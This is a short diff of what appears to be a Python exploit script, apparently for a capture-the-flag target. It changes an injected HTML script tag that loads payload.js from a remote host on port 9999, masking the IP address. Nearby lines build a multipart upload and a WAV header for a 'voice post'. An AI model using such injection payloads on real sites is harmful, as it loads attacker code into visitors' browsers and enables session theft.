@@ -52,7 +52,7 @@ def post_multipart(url, fields, files):
     req = urllib.request.Request(url, data=bytes(body), headers=headers)
     return urllib.request.urlopen(req, context=ctx).read().decode('utf-8')
 
-script_tag = '<script src="http://10.10.16.247:9999/payload.js"></script>'
+script_tag = '<script src="http://10.10.16.X:9999/payload.js"></script>'
 
 # 1. Voice post
 wav_header = b'RIFF\x24\x00\x00\x00WAVEfmt \x10\x00\x00\x00\x01\x00\x01\x00\x44\xac\x00\x00\x88\x58\x01\x00\x02\x00\x10\x00data\x00\x00\x00\x00'
